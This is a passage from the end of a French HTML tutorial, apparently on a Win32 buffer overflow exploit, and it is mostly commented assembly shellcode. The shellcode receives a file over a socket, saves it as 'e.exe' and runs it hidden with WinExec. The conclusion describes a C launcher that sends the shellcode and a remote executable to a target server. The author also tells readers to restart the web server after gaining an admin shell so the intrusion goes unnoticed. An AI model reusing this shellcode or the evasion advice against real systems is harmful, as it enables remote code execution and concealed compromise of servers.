+  <tt><font color="#33CCFF">&nbsp;push ebx&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 
+  </font><font color="#00CC00">; push NULL</font></tt> <br>
+  <tt><font color="#33CCFF">&nbsp;mov eax,not 00CE15BBh&nbsp; </font><font color="#00CC00">; 
+  addresse ou il y a "e.exe"+00</font></tt> <br>
+  <tt><font color="#33CCFF">&nbsp;not eax</font></tt> <br>
+  <tt><font color="#33CCFF">&nbsp;push eax&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 
+  </font><font color="#00CC00">; addresse du nom du fichier</font></tt> <br>
+  <tt><font color="#33CCFF">&nbsp;call dword ptr [ebp+20]</font><font color="#00CC00">;_lcreat</font></tt> 
+  <br>
+  <tt><font color="#33CCFF">&nbsp;mov [esi-32],eax&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 
+  </font><font color="#00CC00">;sauve le handle du fichier dans [esi-32]</font></tt> 
+  <br>
+  &nbsp; </font>
+<p><font face="Verdana, Arial, Helvetica, sans-serif" size="2"><tt><font color="#33CCFF">&nbsp;mov 
+  eax,not 32000&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; </font><font color="#00CC00">; buffer 
+  de 32000 bytes</font></tt> <br>
+  <tt><font color="#33CCFF">&nbsp;not eax</font></tt> <br>
+  <tt><font color="#33CCFF">&nbsp;push eax&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 
+  </font><font color="#00CC00">; push 32000</font></tt> <br>
+  <tt><font color="#33CCFF">&nbsp;mov eax,not GPTR</font></tt> <br>
+  <tt><font color="#33CCFF">&nbsp;not eax</font></tt> <br>
+  <tt><font color="#33CCFF">&nbsp;push eax&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</font><font color="#00CC00"> 
+  ; push GPTR</font></tt> <br>
+  <tt><font color="#33CCFF">&nbsp;call dword ptr [ebp+4]&nbsp; </font><font color="#00CC00">; 
+  GlobalAlloc</font></tt> <br>
+  <tt><font color="#33CCFF">&nbsp;mov [esi-28],eax&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</font><font color="#00CC00">&nbsp; 
+  ; addresse du buffer sauv&eacute;e dans [esi-28]</font></tt> </font>
+<p><font face="Verdana, Arial, Helvetica, sans-serif" size="2"><tt><font color="#33CCFF">1:</font></tt> 
+  <br>
+  <tt><font color="#33CCFF">&nbsp;push ebx</font></tt> <br>
+  <tt><font color="#33CCFF">&nbsp;mov eax,not 32000</font></tt> <br>
+  <tt><font color="#33CCFF">&nbsp;not eax</font></tt> <br>
+  <tt><font color="#33CCFF">&nbsp;push eax&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</font><font color="#00CC00"> 
+  ; push la taille du buffer</font></tt> <br>
+  <tt><font color="#33CCFF">&nbsp;push [esi-28]&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 
+  </font><font color="#00CC00">; push adresse du buffer</font></tt> <br>
+  <tt><font color="#33CCFF">&nbsp;push [esi-24]&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 
+  </font><font color="#00CC00">; push accept socket</font></tt> <br>
+  <tt><font color="#33CCFF">&nbsp;call dword ptr [ebp+48]&nbsp; </font><font color="#00CC00">; 
+  call recv(sockc,buffer,32000)</font></tt> <br>
+  <tt><font color="#33CCFF">&nbsp;xor ecx,ecx</font></tt> <br>
+  <tt><font color="#33CCFF">&nbsp;cmp eax,ecx</font></tt> <br>
+  <tt><font color="#33CCFF">&nbsp;je short 2&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</font><font color="#00CC00">&nbsp;&nbsp; 
+  ; 0 octets lus, on stop</font></tt> <br>
+  <tt><font color="#33CCFF">&nbsp;not ecx</font></tt> <br>
+  <tt><font color="#33CCFF">&nbsp;cmp eax,ecx</font></tt> <br>
+  <tt><font color="#33CCFF">&nbsp;je short 2&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</font><font color="#00CC00">&nbsp;&nbsp; 
+  ; erreur de recv, on stop</font></tt> </font>
+<p><font face="Verdana, Arial, Helvetica, sans-serif" size="2"><tt><font color="#33CCFF">&nbsp;push 
+  eax</font></tt> <br>
+  <tt><font color="#33CCFF">&nbsp;push [esi-28]&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</font><font color="#00CC00"> 
+  ; adresse du buffer</font></tt> <br>
+  <tt><font color="#33CCFF">&nbsp;push [esi-32]&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</font><font color="#00CC00"> 
+  ; handle du fichier</font></tt> <br>
+  <tt><font color="#33CCFF">&nbsp;call dword ptr [ebp+24]&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</font><font color="#00CC00">&nbsp; 
+  ; _lwrite</font></tt> <br>
+  <tt><font color="#33CCFF">&nbsp;jmp short 1</font></tt> </font>
+<p><font face="Verdana, Arial, Helvetica, sans-serif" size="2"><tt><font color="#33CCFF">2:</font></tt> 
+  </font>
+<p><font face="Verdana, Arial, Helvetica, sans-serif" size="2"><tt><font color="#33CCFF">&nbsp;push 
+  [esi-32]&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 
+  </font><font color="#00CC00">;handle du fichier</font></tt> <br>
+  <tt><font color="#33CCFF">&nbsp;call dword ptr [ebp+28]&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</font><font color="#00CC00"> 
+  ;_lclose</font></tt> </font>
+<p><font face="Verdana, Arial, Helvetica, sans-serif" size="2"><tt><font color="#33CCFF">&nbsp;xor 
+  ebx,ebx</font></tt> <br>
+  <tt><font color="#33CCFF">&nbsp;push ebx&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</font><font color="#00CC00"> 
+  ; le flag SW_HIDE permet de cacher la fen&ecirc;tre de l'executable</font></tt> 
+  </font>
+<p><font face="Verdana, Arial, Helvetica, sans-serif" size="2"><tt><font color="#33CCFF">&nbsp;mov 
+  eax,not 00CE15BBh&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; </font><font color="#00CC00">; 
+  cha&icirc;ne "e.exe"+0</font></tt> <br>
+  <tt><font color="#33CCFF">&nbsp;not eax</font></tt> <br>
+  <tt><font color="#33CCFF">&nbsp;push eax&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 
+  </font><font color="#00CC00">; adresse du nom du fichier premier argument de 
+  WinExec</font></tt> </font>
+<p><font face="Verdana, Arial, Helvetica, sans-serif" size="2"><tt><font color="#33CCFF">&nbsp;call 
+  dword ptr [ebp+16]&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; </font><font color="#00CC00">; 
+  WinExec</font></tt> </font>
+<p><font face="Verdana, Arial, Helvetica, sans-serif" size="2"><tt><font color="#33CCFF">&nbsp;push 
+  [esi-24]&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</font><font color="#00CC00"> 
+  ; socket client accept&eacute;e</font></tt> <br>
+  <tt><font color="#33CCFF">&nbsp;call dword ptr [ebp+52]&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 
+  </font><font color="#00CC00">; closesocket</font></tt> </font>
+<p><font face="Verdana, Arial, Helvetica, sans-serif" size="2"><tt><font color="#33CCFF">&nbsp;push 
+  [esi-20]&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 
+  </font><font color="#00CC00">; socket serveur</font></tt> <br>
+  <tt><font color="#33CCFF">&nbsp;call dword ptr [ebp+52]&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 
+  </font><font color="#00CC00">; closesocket</font></tt> </font>
+<p><font face="Verdana, Arial, Helvetica, sans-serif" size="2"><tt><font color="#33CCFF">&nbsp;call 
+  dword ptr [ebp+12]&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; </font><font color="#00CC00">; 
+  GetCurrentProcess()</font></tt> <br>
+  <tt><font color="#33CCFF">&nbsp;xor ebx,ebx</font></tt> <br>
+  <tt><font color="#33CCFF">&nbsp;push ebx&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 
+  </font><font color="#00CC00">; push NULL</font></tt> <br>
+  <tt><font color="#33CCFF">&nbsp;push eax&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 
+  </font><font color="#00CC00">; push la valeur retourn&eacute;e par GetCurrentProcess</font></tt> 
+  <br>
+  <tt><font color="#33CCFF">&nbsp;call dword ptr [ebp+8]&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 
+  </font><font color="#00CC00">; TerminateProcess(Handle_process)</font></tt> 
+  </font>
+<p><font face="Verdana, Arial, Helvetica, sans-serif" size="2">Ouf. Nous voil&agrave; 
+  au bout de nos peines ! Vous compilez &ccedil;a avec Tasm, Nasm ou Masm, ce 
+  qui vous plait le mieux, et voila. </font>
+<p> 
+<p><font face="Verdana, Arial, Helvetica, sans-serif" size="2"><b><u>Conclusion</u></b> 
+  </font>
+<p><font face="Verdana, Arial, Helvetica, sans-serif" size="2">Voila, c'est termin&eacute; 
+  pour cet exploit. Je tiens &agrave; remercier &eacute;norm&eacute;ment _rix 
+  pour m'avoir initi&eacute; au monde merveilleux des buffer overflow, qui peuvent 
+  &ecirc;tre consid&eacute;r&eacute;s comme l'essence du hacking (mais si !).&nbsp; 
+  J'esp&egrave;re que j'ai &eacute;t&eacute; assez clair. J'ai joint un "lanceur" 
+  pour cet exploit, il est cod&eacute; en C, il se connecte sur le port 80, envoi 
+  le shellcode, se connecte sur le port 53 et envoi un fichier local executable. 
+  C'est automatique, pour les faignants comme moi et quelqu'un que je ne citerai 
+  pas, il se reconna&icirc;tra (pour peu qu'il me lise bien sur). La procha&icirc;ne 
+  fois, c'est promis, on s'attaque &agrave; un exploit Linux (shellcode plus simple), 
+  ou alors un autre buffer overflow win32, mais on utilisera les fonctions de 
+  Wininet pour que le prog aille lui m&ecirc;me chercher le fichier sur le Web 
+  et l'execute tout seul comme un grand. Enfin, ce sera pour une autre fois ;))) 
+  <br>
+  En tout cas, ne vous arr&ecirc;tez pas de chercher des failles ! Coller des 
+  &eacute;normes cha&icirc;nes de 'AAAAA' partout comme des fous ! Plantez tout 
+  ! Hesitez pas &agrave; me faire par de vos trouvailles en me <a href="mailto:Obscurer@tipiak.net">mailant.</a> 
+  Ou vous me choppez sur IRC undernet. <br>
+  Bon aller je vous laisse &agrave; vos occupations, je vous ai assez emmerd&eacute; 
+  avec mes buffer overflow :)) </font>
+<p><font face="Verdana, Arial, Helvetica, sans-serif" size="2">(N.B :Au fait, 
+  une fois que vous avez un shell admin ou le contr&ocirc;le du serveur, la premi&egrave;re 
+  chose &agrave; faire c'est de red&eacute;marrer le serveur web, pour pas que 
+  ce soit trop flag quoi&nbsp; :) la syntaxe c'est "<tt>net start https-NOM_DE_LA_MACHINE</tt>" 
+  <br>
+  Voila, merci de m'avoir lu, et &agrave; bient&ocirc;t !</font>
+</body>
+</html>
